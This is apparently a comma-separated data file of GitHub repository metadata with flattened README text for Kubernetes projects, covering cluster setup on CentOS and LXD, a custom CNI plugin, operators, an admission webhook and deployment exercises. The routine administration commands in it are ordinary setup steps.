learncloud,ansible-k8s-cluster,,,2020-08-20T07:54:08Z,2020-09-03T00:49:26Z,Shell,User,1,1,0,8,master,learncloud,1,0,0,0,0,0,0
victorock,k8s-gitops,,GitOps of K8S resources Folder Structure ansible control awx operator yml Control Plane Execution Environment awx resource operator yml Control plane Configuration argocd operator yml Control Plane Configuration Policy gitea operator yml Control Plane Configuration Store ansible data galaxy operator yml Content Distribution gitea operator yml Content Store ansible monitor grafana operator yml Visualization Reporting elastic operator yml Datastore Logging Facts etc prometheus operator yml Telemetry Alert Management prometheus exporter operator yml Telemetry Collector Kustomize wasn t made to manipulate and template multiples entries of the same objects YQ is ideal to query and change YAML k v jinja2 cli is an option to explore in order to templatize configurations Ansible just for templating is overkill,2020-11-24T17:58:05Z,2020-12-11T14:40:37Z,Makefile,User,1,1,0,23,master,victorock,1,0,0,0,0,0,0
dfang,tenant-operator,k8s#k8s-operator#namespace#tenant#tenant-operator,README This is extracted from a real project it use kubernete namespace to isolate resources use consul as kv store the tenants data saved to tenants 306c7c8e953e2dfd5833 uuid and tenants 306c7c8e953e2dfd5833 cname liked keys Features One tenant one namespace Sleep Mode Auto WakeUp Traefik as Ingress Controller Tenent cmd Consul UI brew install consul open http localhost 8500 ui brew install dnsmasq Cname domains for tenant on cloud you can set your dns records but on local etc hosts doesn t support wildcard records so add this to dnsmasq conf address jdwl in 127 0 0 1 the url for a tenant is http jdwl in cname is generated by haikunator http github com atrox haikunatorgo a heroku style random name when tenant created Tenant cmd In real scenario this operator will watch an database table to manipulate a tenant by create update delete sleep Tenant CRD this cmd is for demonstration bin tenant h NAME tenant make an explosive entrance USAGE tenant global options command command options arguments COMMANDS list l list tenants add a add a tenant update u update a tenant cname or replicas scale s scale replicas of deployment for a tenant by uuid sleep sleep sleep a tenant by uuid wakeup wakeup wakeup a tenant by uuid delete d delete a tenant by uuid purge c purge all tenants help h Shows a list of commands or help for one command GLOBAL OPTIONS config FILE Load configuration from FILE help h show help default false Endponits localhost 8080 metrics localhost 8081 healthz localhost 8081 readyz setup postgres operator and pgo client kubectl create namespace pgo kubectl apply f https raw githubusercontent com CrunchyData postgres operator v4 5 1 installers kubectl postgres operator yml setup pgo client https access crunchydata com documentation postgres operator 4 5 1 quickstart postgresql operator installer kubectl n pgo port forward svc postgres operator 8443 8443 pgo create cluster tenants Some commands maybe helpful when developing on local kubectl n pgo port forward svc tenants 5432 5432 export cat env local xargs pgo show user tenants show system accounts pgo delete user username solitary mud a18aaf3f1 selector name tenants no prompt pgo update user n pgo tenants username hidden block 645179a57 password 2d0O o7,2020-10-14T09:15:47Z,2020-11-24T14:05:35Z,Go,User,1,1,2,114,develop,dfang,1,0,0,0,0,0,0
denibertovic,hellok8s,,Hello k8s Sample http application used for demoing k8s,2020-12-08T15:09:43Z,2020-12-11T11:22:58Z,Nix,User,1,1,0,9,master,denibertovic,1,0,0,0,0,0,0
zakkg3,Overkube,,Overkube Automated k8s clusters on demand Workflow 1 Apply overkube CRD Kind OverKube apiVersion ovkb io v1 metadata name overcluster namespace overkube cluster namespace tenant1 workers count 3 memory 4Gb cores 4 master replicas 2 apiServer certSANs 129 132 98 170 controlPlaneEndpoint 129 132 98 170 6443 networking dnsDomain cluster local podSubnet 10 206 176 0 20 serviceSubnet 10 206 146 0 24 2 The operator will start the new k8s overcluster control plane on the namespace cluster namespace https github com kvaps kubernetes in kubernetes At the same time will spawn N workers count Kubevirt vm s using a jinja template wich reads from a configfile so we can change workers size and way to deploy them 3 Once the control plane is in place and the vms are up and running the operator will run a job kopf adopt this job will use asteven scripts to bootstrap the cluster using the kubeadm clusterconfiguration provided in the CRD 4 Everithing is up so the operator updates the crd or create a secret with this info status certificate authority data client certificate data client key data Now we are ready configure kubectl and start using the Overkube,2020-09-07T06:38:12Z,2020-10-01T17:23:13Z,Go,User,2,1,0,10,master,zakkg3,1,0,0,0,0,0,0
ronak-agarwal,custom-cni,,custom cni You can write your custom CNI plugin for k8s Every CNI has usually a binary and a daemon binary create Pod NIC and act as IPAM where as daemon adds routing iptables rules on host to manage pod pod communication Prerequisite Create VM snapshot using Centos7 minimal which has below binaries and configs hcl Install jq and bridge utils on centos yum y install https dl fedoraproject org pub epel epel release latest 7 noarch rpm yum y install jq yum y install bridge utils wget systemctl disable firewalld systemctl stop firewalld etc selinux config SELINUX permissive Configure repo cat etc yum repos d kubernetes repo kubernetes name Kubernetes baseurl http yum kubernetes io repos kubernetes el7 x8664 enabled 1 gpgcheck 1 repogpgcheck 1 gpgkey https packages cloud google com yum doc yum key gpg https packages cloud google com yum doc rpm package key gpg EOF yum install y docker kubelet kubeadm kubectl kubenetes cni systemctl enable docker systemctl start docker systemctl enable kubelet systemctl start kubelet sysctl w net bridge bridge nf call iptables 1 echo net bridge bridge nf call iptables 1 etc sysctl d k8s conf swapoff a sed i swap s etc fstab Below steps are repeated for every node 1 Copy custom cni to opt cni bin custom cni Typically any CNI script has ADD DEL verbs Below script is to create veth on host for every pod and assign Pod IPs based on Pod CIDR range of each node and link that to a virtual bridge Script contains a Create a bridge on node b Script to generate IP from POD CIDR range provided in kubeadm c Create veth on host node which will be mapped to pod eth0 d Assign above veth nic to network namespace created by kubelet using Docker runtime e Assign IP address to network namespace pod this is IPAM You can see CNI logs as configured in the script at this place var log cni log NOTE There is a custom script to generate IP of POD acting as IPAM which stores a file in tmp and increment by 1 everytime pod is created 2 Copy 10 custom cni conf to etc cni net d 10 custom cni conf Change pod cidr range on every node Eg Node1 10 240 0 0 24 Node2 10 240 1 0 24 CNI config png https github com ronak agarwal custom cni blob master images CNI config png 3 Initiate k8s cluster setup on master using kubeadm kubeadm init pod network cidr 10 240 0 0 24 Note this Pod CIDR range is for entire cluster and should cover node specific pod CIDR range configured in 10 custom cni conf file 24 range So below are pod CIDR ranges configured hcl Node1 10 240 1 0 24 Node2 10 240 0 0 24 Setup png https github com ronak agarwal custom cni blob master images Setup png Packet Flow Between Pods This is to show packet flow actual data from Pod to Pod on same host and different hosts hcl kubectl apply f pods yaml two pods will land on Node2 alpine and nginx1 one pod will land on Node1 nginx2 4 ADD static iptable rules to enable Pod to Pod communication on same host SameHost png https github com ronak agarwal custom cni blob master images SameHost png Eg Add On Node2 hcl eth0 in Pod As netns vethA br0 vethB eth0 in Pod Bs netns iptables A FORWARD s 10 240 0 0 24 j ACCEPT 24 entire node pod cidr iptables A FORWARD d 10 240 0 0 24 j ACCEPT Forward chain is responsible for allowing such chain kubectl exec alpine1 wget qO 10 240 0 8 Pod to Pod on same node assuming alpine and nginx1 is running on Node2 Similarly add on Node1 hcl iptables A FORWARD s 10 240 1 0 24 j ACCEPT 24 entire node pod cidr iptables A FORWARD d 10 240 1 0 24 j ACCEPT 5 ADD route to Allow communication across hosts DifferentHost png https github com ronak agarwal custom cni blob master images DifferentHost png hcl Ideal flow from CNI plugin since I don t have vxlan IPIP encapsulation so I have used source nat MASQUERADE which does same thing eth0 in Pod As netns vethA br0 vxlan0 physical network underlay vxlan0 br0 vethB eth0 in Pod Cs netns ip route add 10 240 1 0 24 via 10 0 2 14 dev enp0s3 add in Node2 Above command is good for baremetal local VMs VBox but for Cloud Providers like GCP you need to setup custom routes at Layer2 gcloud compute routes create k8s node2 destination range 10 240 1 0 24 network k8s next hop address 10 0 2 14 Similarly Azure has User Defined Routes and AWS has Route Tables Route any packet for node1 podcidr 10 240 1 0 24 to node1 ip via device enp0 hcl ip route add 10 240 0 0 24 via 10 0 2 15 dev enp0s3 add in Node1 On GCP gcloud compute routes create k8s node1 destination range 10 240 0 0 24 network k8s next hop address 10 0 2 15 Route any packet for node2 podcidr 10 240 0 0 24 to node2 ip via device enp0 GCP cross hosts DifferentHost png https github com ronak agarwal custom cni blob master images GCP InterHost png 6 Allow outgoing internet from Pods by adding NAT rule in iptables On Node2 hcl Below is the flow from Pod A to get Internet so I have added POSTROUTING nat rule eth0 in Pod As netns vethA br0 NAT eth0 physical device Internet iptables t nat A POSTROUTING s 10 240 0 0 24 o cni0 j MASQUERADE Add in POSTROUTING chain last chain to evaluate outgoing packet and need to add in linux NAT table and making sure only those packet which are not going out to cni bridge MASQUERADE meaning apply to source nat replace source IP with host IP kubectl exec alpine1 ping 8 8 8 8 Assuming alpine pod running on node2 K8S Services Kubernetes Services are not part of CNI plugin and managed natively via kube proxy so if Pod to Pod communication sorted then Services Pod communication just work straight away below Service IP will be reachable from both Nodes Hosts Pods hcl kubectl label pods nginx2 app nginx2 kubectl expose pod nginx2 name nginx2 port 8000 target port 80 Some commands hcl iptables S FORWARD to see FORWARD chain iptables t nat L KUBE SERVICES to see kube proxy s and d nating Using tshark to see source and destination of packet along with protocol tshark i cni0 T fields e ip src e ip dst e frame protocols E header y CNI Commands to add network veth and IPs using existing CNI binaries For ptp binary and using host local IPAM hcl ip netns add demo Create a network namespace on your host When you install kubernetes cni YUM package it adds lots of default CNI binaries at this location opt cni bin So for this example I copied ptp and host local to root cni and created a config file for my CNI plugin root cni conf EOF cniVersion 0 4 0 name democni type ptp ipam type host local subnet 10 20 0 0 24 EOF Run below commands and watch route in demo netns using exec command ip netns exec demo route n CNICOMMAND VERSION ptp conf To find CNI versions supported by binary CNICOMMAND ADD CNINETNS var run netns demo CNIIFNAME demoeth0 CNIPATH root cni CNICONTAINERID 12345678 ptp conf CNICOMMAND DEL CNINETNS var run netns demo CNIIFNAME demoeth0 CNIPATH root cni CNICONTAINERID 12345678 ptp conf Other links I did similar work here which is confined to only container network https github com ronak agarwal rocker Setup k8s on Centos7 https medium com genekuo setting up a multi node kubernetes cluster on a laptop 69ae3e3d0f7c https events19 linuxfoundation org wp content uploads 2018 07 PacketWalksInKubernetes v4 pdf https www stackrox com post 2020 01 kubernetes networking demystified https github com kristenjacobs container networking,2020-09-24T14:33:38Z,2020-10-20T16:44:59Z,Shell,User,1,1,0,2,master,ronak-agarwal,1,0,0,0,0,0,0
shipperizer,custom-metrics-k8s,,Tried acabbia ldcl141282m 19 21 54 kubectl get raw apis custom metrics k8s io v1beta1 namespaces metrics labsapicount Error from server ServiceUnavailable the server is currently unable to handle the request acabbia ldcl141282m 19 21 58 kubectl get raw apis custom metrics k8s io v1beta1 jq kind APIResourceList apiVersion v1 groupVersion custom metrics k8s io v1beta1 resources name services labsapicount singularName namespaced true kind MetricValueList verbs get name namespaces labsapicount singularName namespaced false kind MetricValueList verbs get name nodes labsapicount singularName namespaced false kind MetricValueList verbs get acabbia ldcl141282m 19 30 55 kubectl get raw apis custom metrics k8s io v1beta1 namespaces default services labsapicount jq kind MetricValueList apiVersion custom metrics k8s io v1beta1 metadata selfLink apis custom metrics k8s io v1beta1 namespaces default services 2A labsapicount items acabbia ldcl141282m 19 47 49 kubectl get raw apis custom metrics k8s io v1beta1 jq kind APIResourceList apiVersion v1 groupVersion custom metrics k8s io v1beta1 resources name namespaces labsapicount singularName namespaced false kind MetricValueList verbs get name nodes labsapicount singularName namespaced false kind MetricValueList verbs get acabbia ldcl141282m 16 33 04 kubectl get raw apis custom metrics k8s io v1beta1 namespaces default pods httprequestspersecond jq kind MetricValueList apiVersion custom metrics k8s io v1beta1 metadata selfLink apis custom metrics k8s io v1beta1 namespaces default pods 2A httprequestspersecond items describedObject kind Pod namespace default name sample app 8697c9f9b9 m94td apiVersion v1 metricName httprequestspersecond timestamp 2020 12 02T16 38 15Z value 33m selector null describedObject kind Pod namespace default name sample app 8697c9f9b9 p4q8t apiVersion v1 metricName httprequestspersecond timestamp 2020 12 02T16 38 15Z value 33m selector null Useful links API paths https github com kubernetes community blob master contributors design proposals instrumentation custom metrics api md api paths Config https github com DirectXMan12 k8s prometheus adapter blob master docs config md Config Walkthru https github com DirectXMan12 k8s prometheus adapter blob master docs config md,2020-11-25T20:17:11Z,2020-12-10T15:28:13Z,Makefile,User,1,1,0,11,main,shipperizer,1,0,0,0,0,0,0
tomlinux,k8s-test,,centos8 k8s sudo dnf groupinstall Development Tools sudo dnf install libglvnd devel elfutils libelf devel sudo yum install kernel devel sudo yum y install epel release sudo yum y install dkms sudo dnf install wget nouveau sudo grub2 editenv set grub2 editenv list grep kernelopts nouveau modeset 0 sudo mv boot initramfs uname r img boot initramfs uname r img nouveau sudo dracut boot initramfs uname r img uname r Nvidia wget https us download nvidia cn XFree86 Linux x8664 440 82 NVIDIA Linux x8664 440 82 run kernel source path sudo NVIDIA Linux x8664 440 82 run kernel source path usr src kernels 4 18 0 193 6 3 el82 x8664 nvidia smi 1docker yum remove podman yum install y yum utils device mapper persistent data lvm2 yum config manager add repo http mirrors aliyun com docker ce linux centos docker ce repo yum makecache rpm import https mirrors aliyun com docker ce linux centos gpg yum remove containerd io 1 2 4 3 1 el7 x8664 yum install https download docker com linux fedora 30 x8664 stable Packages containerd io 1 2 6 3 3 fc30 x8664 rpm yum list docker ce x8664 showduplicates sort r yum y install docker ce 2kubelet kubeadm cat etc yum repos d kubernetes repo EOF kubernetes name Kubernetes baseurl https mirrors aliyun com kubernetes yum repos kubernetes el7 x8664 enabled 1 gpgcheck 1 repogpgcheck 1 gpgkey https mirrors aliyun com kubernetes yum doc yum key gpg https mirrors aliyun com kubernetes yum doc rpm package key gpg EOF yum install y kubelet kubeadm kubectl systemctl enable kubelet systemctl start kubelet 3kubernete kubeadm init apiserver advertise address 192 168 31 222 image repository registry aliyuncs com googlecontainers kubernetes version v1 19 3 pod network cidr 10 244 0 0 16 Your Kubernetes control plane has initialized successfully To start using your cluster you need to run the following as a regular user mkdir p HOME kube sudo cp i etc kubernetes admin conf HOME kube config sudo chown id u id g HOME kube config kubectl apply f https raw githubusercontent com coreos flannel master Documentation kube flannel yml 4dashboard kubectl apply f https raw githubusercontent com kubernetes dashboard v2 0 4 aio deploy recommended yaml 1 Creating a Service Account cat EOF kubectl apply f apiVersion v1 kind ServiceAccount metadata name admin user namespace kubernetes dashboard EOF Creating a ClusterRoleBinding cat EOF kubectl apply f apiVersion rbac authorization k8s io v1 kind ClusterRoleBinding metadata name admin user roleRef apiGroup rbac authorization k8s io kind ClusterRole name cluster admin subjects kind ServiceAccount name admin user namespace kubernetes dashboard EOF kubectl n kubernetes dashboard describe secret kubectl n kubernetes dashboard get secret grep admin user awk print 1 You should now deploy a pod network to the cluster Run kubectl apply f podnetwork yaml with one of the options listed at https kubernetes io docs concepts cluster administration addons Then you can join any number of worker nodes by running the following on each as root kubeadm join 192 168 31 222 6443 token 62ni5c b98xoupf0ewi12i3 discovery token ca cert hash sha256 c893c56a511b6bc4451174d1f8c5f79986a0f97b152d1f33755e025d974f2496 5 kubesphere https kubesphere io docs quick start minimal kubesphere on k8s kubectl apply f https github com kubesphere ks installer releases download v3 0 0 kubesphere installer yaml kubectl apply f https github com kubesphere ks installer releases download v3 0 0 cluster configuration yaml kubectl logs n kubesphere system kubectl get pod n kubesphere system l app ks install o jsonpath items 0 metadata name f kubectl get pod test pod n default o yaml kubectl replace force f masterpod kubectl taint nodes all node role kubernetes io master kubectl taint nodes master1 node role kubernetes io master NoSchedule NoSchedule PreferNoSchedule NoExecute NodePod 6 nvidia docker 2 0 nvidia docker2 repo distribution etc os releaseecho ID VERSIONID curl s L https nvidia github io nvidia docker distribution nvidia docker repo sudo tee etc yum repos d nvidia docker repo nvidia dockerdocker sudo yum install y nvidia docker2 sudo pkill SIGHUP dockerd cuda 9 0nvidia smi docker run runtime nvidia rm nvidia cuda 9 0 base nvidia smi 7nvidia docker2 Docker Runtime Runtimenvidia root test k8s test cat etc docker daemon json runtimes nvidia path nvidia container runtime runtimeArgs default runtime nvidia docker sudo systemctl restart docker cuda 9 0nvidia smi docker run runtime nvidia rm nvidia cuda 9 0 base nvidia smi root test k8s test docker run runtime nvidia rm nvidia cuda 9 0 base nvidia smi Thu Nov 12 03 33 27 2020 NVIDIA SMI 455 38 Driver Version 455 38 CUDA Version 11 1 GPU Name Persistence M Bus Id Disp A Volatile Uncorr ECC Fan Temp Perf Pwr Usage Cap Memory Usage GPU Util Compute M MIG M 0 GeForce GTX 1070 Off 00000000 02 00 0 Off N A 29 29C P8 12W 151W 0MiB 8116MiB 0 Default N A Processes GPU GI CI PID Type Process name GPU Memory ID ID Usage No running processes found 8k8s device plugin kubectl create f https github com NVIDIA k8s device plugin blob master nvidia device plugin yml kubectl describe nodesGPUNodeGPU root test k8s test kubectl describe nodes Capacity cpu 8 ephemeral storage 51175Mi hugepages 1Gi 0 hugepages 2Mi 0 memory 24448560Ki nvidia com gpu 1 pods 110 Allocatable nvidia com gpu 1,2020-11-12T03:56:50Z,2020-12-29T09:16:41Z,C,User,1,1,0,16,main,tomlinux,1,0,0,0,0,0,0
hanlins,k8s-95727,,Test repo for issue 95727 This repo is used to reproduce https github com kubernetes kubernetes issues 95727 Download k8s mods Credits to abursavich for shared a scrip https github com kubernetes kubernetes issues 79384 issuecomment 521493597 for downloading the k8s mods In our case we re debugging v1 19 3 run the script to download everything needed bash bash x hack download sh 1 19 3 Compile the binary To test it on a Linux VM do the following to cross compile bash GOARCH amd64 GOOS linux go build ldflags s w Reproduce steps 1 start the binary 2 start monitoring CPU usage e g using top 3 restart containerd e g systemctl restart containerd,2020-10-28T21:03:48Z,2020-12-11T04:47:43Z,Shell,User,1,1,2,10,master,hanlins,1,0,0,0,0,0,0
ldipotetjob,cassandra_k8s_aws,,cassandrak8saws Cassandra on k8s in EKS,2020-08-19T22:33:24Z,2020-10-16T10:30:20Z,n/a,User,1,1,0,3,master,ldipotetjob,1,0,0,0,0,0,0
msscaroso,k8s-notes,,,2020-10-21T00:59:37Z,2020-11-16T23:55:53Z,n/a,User,1,1,0,4,master,msscaroso,1,0,0,0,0,0,0
xll-forever,k8s-etcd,,k8s etcd k8s statefulset for etcd cluster,2020-10-12T06:42:18Z,2020-11-27T07:02:59Z,Shell,User,1,1,0,1,main,xll-forever,1,0,0,1,0,0,0
cici37,k8s-validation-webhook,,Kubernetes Admission Controller Webhook Demo This repository contains a small HTTP server that can be used as a Kubernetes ValidatingAdmissionWebhook https kubernetes io docs reference access authn authz admission controllers validatingadmissionwebhook The logic of this demo webhook is fairly simple it enforces more secure defaults for running containers as non root user If runAsNonRoot is set to false or no correct value is set for runAsNonRoot it will faile the request and return error Reference solution The maniSbindra k8s delete validation webhook https github com maniSbindra k8s delete validation webhook is been referenced for initialization configuration of this application The stackrox admission controller webhook demo https github com stackrox admission controller webhook demo is been referenced for create and update resource validations Installation Building and Pushing the container image The Make target docker build or docker build local can be used to create the container image The make docker push makefile target can be used to push the container image to the container registry With the make docker build local makefile target you need dependencies like glide on your machine the make docker build makefile target uses a multi stage build for building the go binary Make sure you change the values of CONTAINERNAME CONTAINERVERSION in the Make file The deployments webhook k8s resources template yaml https github com cici37 k8s validation webhook blob master deployments webhook k8s resources template yaml L7 is the kubernetes manifest template for this solution The main kubernetes resources to be created are ValidatingWebhookConfiguration a deployment and a service The template has place holders for the TLS Certificate the TLS Key the CA Bundle and the container image The Steps https github com avast k8s admission webhook example configuration mentioned of the avast repository explain how to replace values in the yaml template file Instead of manually doing it you can using the make gen k8s manifests Makefile target from this solution This is described in more detail as follows The makefile target make gen k8s manifests in this solution has all steps to replace values in the template and as an output it generates the deployments webhook k8s resources yaml which has certificate key and the ca bundle in the yaml To execute this make target you need to have access to the target kubernets cluster KUBECONFIG or kube config Before running the make target verify that the values of the CONTAINERNAME CONTAINERVERSION WEBHOOKNAMESPACE and WEBHOOKSERVICENAME in the Makefile are correct After this applying the generated deployments webhook k8s resources yaml file creates all required kubernetes resources By default entry for this generated file is in the gitignore file Commands Clone the repo sh git clone https github com cici37 k8s validation webhook git Modify Makefile values for CONTAINERNAME CONTAINERVERSION WEBHOOKNAMESPACE and WEBHOOKSERVICENAME Make sure you are logged in to the container registry and have access to the kubernetes cluster Build and Push container image sh make docker build make docker push Generate certs keys and generate actual yaml from yaml template sh make gen k8s manifests Apply the yaml sh kubectl apply f deployments webhook k8s resources yaml Verify installation Check the deployment k8s delete validation webhook for which a pod should be running sh kubectl get deploy k8s validation webhook add the label webhook enabled to the default namespace Note this is the default value and can be changed in the namespace selector https github com maniSbindra k8s delete validation webhook blob 9f86e415d4365c66f484e5a543935e950f3026a1 deployments webhook k8s resources template yaml L107 sh kubectl label namespace default webhook enabled Create pods with examples sh kubectl create f examples pod with defaults yaml kubectl create f examples pod with override yaml kubectl create f examples pod with conflict yaml kubectl create f examples pod with userset yaml First three creation should fail by webhook,2020-11-11T14:02:27Z,2020-12-08T13:52:22Z,Go,User,1,1,0,2,main,cici37,1,0,0,0,0,0,0
beacon-biosignals,K8sClusterManagers.jl,,K8sClusterManagers This repo contains a cluster manager for provisioning julia workers on a k8s cluster making minimal assumptions about your cluster setup K8sNativeManager This is a ClusterManager for usage from a driver julia session that is running on the cluster already has access to a working kubectl from the julia running in k8s container context You can easily set yourself up with just such a julia session Assuming you have kubectl installed locally and configured to connect to a cluster in namespace my namespace the following driver yaml file containing a pod spec yaml apiVersion v1 kind Pod metadata name example driver pod spec containers name kubectl sidecar image bitnami kubectl command kubectl args proxy port 8001 name driver image julia 1 5 2 stdin true tty true will get you a julia REPL running in the cluster alongside a kubectl proxy that it can talk to by doing bash kubectl apply f driver yaml n my namespace and once the pod is running kubectl attach pod example driver pod c driver it n my namespace Now in this julia REPL session you can do julia using K8sClusterManagers pids K8sClusterManagers addprocspod 2 namespace my namespace advanced configuration K8sClusterManagers addprocspod exposes a configure kwarg that can be used to make arbitrary modifications to the pod spec defining workers which defaults to the identity function configure pod will be called on a Kuber jl object pod representing a pod spec and it must return an object of the same type Kuber jl makes it convenient to manipulate this pod by letting you do things such as julia function myconfigurator pod push pod spec tolerations key gpu operator Equal value true return pod end To get an example instance of pod that might be passed into the configure call julia pod ctx K8sClusterManagers defaultpodandcontext my namespace useful commands Monitor the status of all your pods bash watch n 1 kubectl get pods services n my namespace tail the stdout of workers example driver pod bash kubectl logs f pod example driver pod c example driver pod worker 9001 n my namespace Currently cleaning up after killing all your pods can be slow ineffective from a julia context especially if the driver julia session dies unexpectedly It may be necessary to kill your workers from the command line bash kubectl delete pod example driver pod worker 9001 n my namespace grace period 0 force true It may be convenient to set a common label in your worker podspecs so that you can select them all with l by label and kill all the worker pods in one invocation Display info about a pod this is especially useful to troubleshoot a pod that is taking longer than expected to get up and running bash kubectl describe pod example driver pod n my namespace troubleshooting If you get deserialize errors during interations between driver and worker processes make sure you are using the same version of Julia on the driver as on all the workers If you aren t sure what went wrong check the logs The syntax is bash kubectl logs f n my namespace podname c containername where the pod name podname you can get from kubectl get pods n my namespace and containername from bash kubectl describe pod podname n my namespace,2020-12-11T16:21:26Z,2020-12-16T17:06:42Z,Julia,Organization,11,1,0,2,main,kolia,1,0,0,6,0,1,0
kuritka,k8gb-tools,,,2020-09-13T21:24:49Z,2020-11-19T12:14:44Z,Go,User,1,1,0,39,master,kuritka,1,0,0,0,0,0,0
minhpq331,demo-zero-downtime,,demo zero downtime Demo zero downtime with k8s Thng tin ng dng Docker image Version 1 minhpq331 demo zero downtime v1 0 Version 2 minhpq331 demo zero downtime v2 0 Bin mi trng PORT 3000 Application s chy trn cng 3000 Thc hnh 1 Khi chy application vi version 1 0 To 1 file deployment yaml vi mu t cc bi trc trin khai ng dng vi image c cung cp trn Chn replica 2 To 1 file service yaml vi mu t cc bi trc expose ng dng dng ClusterIP To 1 file ingress yaml vi mu t bi trc gi ti ng dng bng domain Thc hnh 2 Test rolling update Ti tool load test https github com fortio fortio https github com fortio fortio Sa file depbngloyment yaml v thm cu hnh sau vo phn spec ca deployment yaml spec strategy type RollingUpdate Strategy name rollingUpdate maxSurge 1 Number of over scheduled pod maxUnavailable 0 Sa image tag thnh version 2 v2 0 Apply thay i bng kubectl n apply f deployment yaml Chy c u lnh sau load test yaml fortio load qps 100 t 60s http 30080 Kim tra kt qu xem bao nhiu request failed Thc hnh 3 Cu hnh healthcheck v PreStop hook Sa li file deployment yaml v thm cu hnh sau yaml containers image minhpq331 demo zero downtime v1 0 livenessProbe httpGet path live port 3000 initialDelaySeconds 10 periodSeconds 5 readinessProbe httpGet path ready port 3000 initialDelaySeconds 10 periodSeconds 5 lifecycle preStop exec command bin sh c sleep 10 Sa li image ng dng t version v2 0 thnh v1 0 Apply thay i bng kubectl n apply f deployment yaml Chy c u lnh sau load test yaml fortio load qps 100 t 60s http 30080 Kim tra kt qu xem bao nhiu request failed,2020-11-08T17:23:07Z,2020-12-16T07:55:58Z,JavaScript,User,1,1,0,6,main,minhpq331,1,0,0,0,0,0,0
Bar0hayon,kubernetes-deployments,,Kubernetes Deployments Description Deploying clusters on top of kubernetes Tools 1 kafka using strimzi kafkastrimzi 2 elasticsearch elasticsearch,2020-12-03T14:33:55Z,2020-12-28T11:56:26Z,Shell,User,1,1,0,12,main,Bar0hayon,1,0,0,0,0,0,0
sivasubramanian95,selenium-on-kubernetes,,selenium on kubernetes Sample selenium setup in k8s,2020-08-28T06:09:14Z,2020-11-03T07:06:41Z,n/a,User,1,1,0,2,master,sivasubramanian95,1,0,0,0,0,0,0
liuxianpeng0816,github.io,,github io,2020-08-26T02:47:26Z,2020-08-26T02:56:13Z,n/a,User,1,1,0,1,master,liuxianpeng0816,1,0,0,0,0,0,0
vinnie357,demo-nginx-consul-azure,,demo nginx consul azure nginx k8s consul in aks Requirements azure storage bucket with controller tarball eg controller installer 3 7 0 tar gz Controller license file trial license https www nginx com free trial request nginx controller Nginx plus cert key trial keys https www nginx com free trial request Prep create storage bucket with controller install tar gz file Example in storage copy example admin vars to new file bash cp admin auto tfvars example admin auto tfvars update admin vars to your variables Run login and run bash az login demo sh,2020-08-27T20:04:13Z,2020-10-27T16:31:20Z,HCL,User,4,1,0,25,main,vinnie357#mjmenger,2,0,0,0,0,0,1
minininja,hooks,,hooks This is just me messing around with jobs in k8s I have a raspberry pi cluster and want to do servless but nothing is built for the ARM CPUs on the PIs So I thought I d try using jobs instead Maybe this ll go somewhere and maybe not Who knows,2020-11-04T02:00:36Z,2020-12-02T01:03:16Z,TypeScript,User,1,1,0,3,main,minininja,1,0,0,0,0,0,0
keeyzar,lxd-k8s-cluster,automated#bash#focal#k8s#k8s-cluster#kubernetes#kubernetes-cluster#kubernetes-setup#loadbalancer#lxc#lxd#metallb#nfs#nfs-client-provisioner#nfs-server#ubuntu#ubuntu2004,LXC LXD multi kubernetes with metallb and local nfs server Hi this script is heavily influenced by https github com corneliusweig kubernetes lxd thanks for your great work Please read the corresponding code before you execute anything from the web prerequisites warning this script is ONLY testet on uname r 5 8 0 33 generic it should work with a greater variety but no promises administrator privileges are necessary i e for setting chmod on kubeconfig file or for installing nfs server lxd etc what does this repository provide 1 optional install LXD by code configure it by code 2 fully automated 2 lxc container kubernetes cluster with kubeadm install 3 fully automated metallb loadbalancer installation 4 more or less fully automated nfs server configuration and providing of storage class disclaimer execute with caution on your own behalf DESTROYING warning this installation will overwrite YOUR ACUTAL kube config file save it or it ll be removed warning this script installs lxd on your HOST system warning this script installs nfs kernel server on your HOST system contribute if you want to contribute We can surely improve the automation script install a nfs server in a container with e g user namespace nfs server if it s possible to remove sudo calls we should try make the installation script more configurable i e do not overwrite kube config file installation possibilites 1 you may copy paste each function on your own and run it from install script sh as seen in this file 2 you can install all 4 components lxd k8s metallb nfs server 3 you can install 3 components k8s metallb nfs server part 1 automatically install everything warning THIS WILL CHANGE YOUR HOST SYSTEM PROCEED WITH CARE git clone https github com keeyzar lxd k8s cluster cd lxd k8s cluster chmod x install script sh installlxd True install script sh installlxd part 2 automatically install everything EXCEPT lxd git clone https github com keeyzar lxd k8s cluster cd lxd k8s cluster chmod x install script sh installlxd False install script sh installlxd part 3 running the function calls of install script by hand first set source some files for getting all functions git clone https github com keeyzar lxd k8s cluster cd lxd k8s cluster DIR cd dirname BASHSOURCE 0 dev null 2 1 pwd subdir script files no worries everything is packed into functions source DIR subdir lxd install sh source DIR subdir install kubernetes cluster sh source DIR subdir install metallb sh source DIR subdir install nfs sh node k8s control plane worker k8s worker now you can either install each component on it s own each of these functions are independently executable but of course the last two calls install metallb and full install need a working kube config file if you want to install lxd installlxdfully if you want to only use lxc and install k8s cluster setupk8scluster if you want to install the metallb into the k8s cluster installmetallbfully if you want to install nfs on your system and in the k8s cluster as SC fullinstallnfs part 4 highly detailled function execution on it s own this is if you want to go step by step and verify each step with higher granularity again source the code git clone https github com keeyzar lxd k8s cluster cd lxd k8s cluster DIR cd dirname BASHSOURCE 0 dev null 2 1 pwd subdir script files no worries everything is packed into functions source DIR subdir lxd install sh source DIR subdir install kubernetes cluster sh source DIR subdir install metallb sh source DIR subdir install nfs sh node k8s control plane worker k8s worker now we re going to do everything by hand what the other methods have done at part 3 install lxd on your host system installlxd add some kernel parameters and install conntrack configurehostsystemforlxd configure lxd lxd init with preseed so you do not need to configure it interactive configurelxd lxd part is finished of course you can modify each file or look deeper into the files which you should definitely do be4 you execute any code found in the world wide web do we want to override the kubeconfig file existing at the moment yes or metallb and storage class functionality is not possible overwritekubeconfig True well this is a full blown installation of 2 nodes download k8s set up with kubeadm as a cluster installk8sinlxc node worker overwritekubeconfig we need an overlay network for a working kubernetes cluster this step does not work if you skipped overwrite kubeconfig setupcalico untaint control plane so it s usable as worker too utilizecontrolplaneasworker well apply some resources from www installmetallb set up metallb to use x x x 240 x x x 249 as IP pool so you can have up to 10 ips for loadbalancers configuremetallb make sure metallb works as expected gives out some ips to nginx service checkfunctionalityofmetallb now the metallb is installed last but not least the storage provider as nfs install nfs server components on HOST system installnfsserveronhostandstart we overwrite the actual nfs server configuration files only the two nodes are allowed to access a specific freshly created folder configureaccesstonfsfromnodes node worker now the guest container need some software installed as nfs provisioner pod will utilize the host i e one of the two containers for mounting configurehosts node worker well for nfs makestorageclassandrbacrules last but not least install the pod provisioner deployment installnfspodprovisioner checking if PVC can 